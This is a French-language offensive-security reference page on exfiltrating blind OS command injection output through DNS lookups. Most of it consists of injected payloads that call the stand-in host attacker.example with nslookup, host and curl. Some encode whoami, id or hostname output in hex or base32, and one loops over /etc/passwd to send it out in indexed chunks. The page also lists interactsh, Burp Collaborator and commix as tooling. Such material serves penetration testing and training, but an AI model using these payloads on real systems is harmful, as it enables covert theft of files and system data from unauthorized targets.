---
title: "Exfiltration hors bande DNS en injection de commande aveugle"
description: "Encoder la sortie d'une commande dans un label de sous-domaine DNS pour qu'elle quitte une cible d'injection de commande OS aveugle via la résolution de noms, capturée par interactsh ou un serveur dnsbin."
keywords:
  - injection de commande aveugle
  - exfiltration DNS
  - hors bande
  - interactsh
  - dnsbin
  - exfiltration de données
---

# Canal hors bande DNS

En injection de commande **aveugle**, la commande s'exécute mais sa sortie n'atteint jamais la réponse. L'exfiltration hors bande (OOB) par DNS récupère cette sortie en faisant **résoudre par la cible un nom d'hôte que vous contrôlez**, le résultat de la commande étant emballé dans le label de sous-domaine. Même les hôtes qui bloquent le HTTP sortant effectuent généralement encore des recherches DNS via un résolveur interne, de sorte que la résolution de noms est le canal de sortie le plus fiable.

## Mécanisme

Insérez la sortie de la commande dans le label d'un domaine dont vous surveillez le serveur faisant autorité. N'importe quel outil DNS déclenche la recherche :

```
127.0.0.1; nslookup $(whoami).OOB_ID.attacker.example
127.0.0.1; host $(id|cut -d' ' -f1).OOB_ID.attacker.example
127.0.0.1; curl http://$(hostname).OOB_ID.attacker.example/
```

Lorsque le résolveur parcourt la chaîne jusqu'à `attacker.example`, votre serveur enregistre une requête pour `app01.OOB_ID.attacker.example`, confirmation de l'exécution *et* une copie des données. Un contact arrive même lorsque le pare-feu n'autorise que le DNS.

## Encoder la sortie dans un label

Les labels DNS sont limités (≤63 caractères par label, `[a-z0-9-]`, insensibles à la casse). Normalisez la sortie avant qu'elle ne devienne un nom d'hôte :

```
# hex-encode to survive the charset and case-folding
127.0.0.1; nslookup $(whoami|xxd -p|head -c40).OOB_ID.attacker.example

# base32 is label-safe (no padding issues once lowercased)
127.0.0.1; nslookup $(id|base32|tr -d '='|tr A-Z a-z).OOB_ID.attacker.example
```

base64 convient mal (`+`, `/`, `=` et la casse ne sont pas label-safe) ; préférez **hex** ou **base32**.

## Découper des données plus longues

Une sortie plus grande qu'un label doit être découpée et réassemblée à partir du journal de requêtes. Bouclez sur des tranches de taille fixe et taguez chacune avec son index :

```
127.0.0.1; for i in 0 1 2 3; do \
  nslookup $i.$(cut -c$((i*20+1))-$((i*20+20)) /etc/passwd|xxd -p).OOB_ID.attacker.example; \
done
```

Un schéma courant lit un fichier, l'encode en hex et émet des labels séquentiels (`0.<data>`, `1.<data>`, …) ; l'index vous laisse ordonner les fragments qui arrivent dans le désordre. `fold`/`split` ou `xargs -n1` pilotent le découpage là où une boucle `for` est peu pratique.

## Capturer les callbacks

- **[interactsh](https://github.com/projectdiscovery/interactsh)**, serveur OOB auto-hébergeable ; `interactsh-client` affiche chaque interaction DNS avec le nom interrogé complet.
- **Burp Collaborator**, génère un sous-domaine unique et montre les contacts DNS/HTTP dans Repeater/Intruder.
- **dnsbin / dnslog.cn / services de type requestbin**, catchers publics rapides pour les labs où l'auto-hébergement n'est pas justifié.
- Votre propre DNS faisant autorité (`tcpdump -n port 53`, ou un résolveur journalisant) lorsque vous contrôlez un domaine.

## Notes de livraison

Le payload lui-même est injecté avec n'importe quelle primitive de séparateur ou de substitution (`;`, `&&`, `$(...)`) ; l'exfiltration DNS porte sur le **canal**, pas sur l'injection. Préférez `$(...)` pour que la sortie soit insérée en ligne, et gardez la commande génératrice courte, les limites de longueur de label et de nom total plafonnent la quantité de données qui tient sur une seule requête, ce qui explique précisément pourquoi le découpage compte.

## Outils

- **[interactsh](https://github.com/projectdiscovery/interactsh)**, capture d'interactions OOB.
- **[commix](https://github.com/commixproject/commix)**, automatise l'exploitation aveugle/OOB de l'injection de commande.
- **Burp Collaborator**, catcher de callback DNS/HTTP intégré.

## Références

- [PortSwigger Web Security Academy: Blind OS command injection with out-of-band exfiltration](https://portswigger.net/web-security/os-command-injection)
- [OWASP: OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
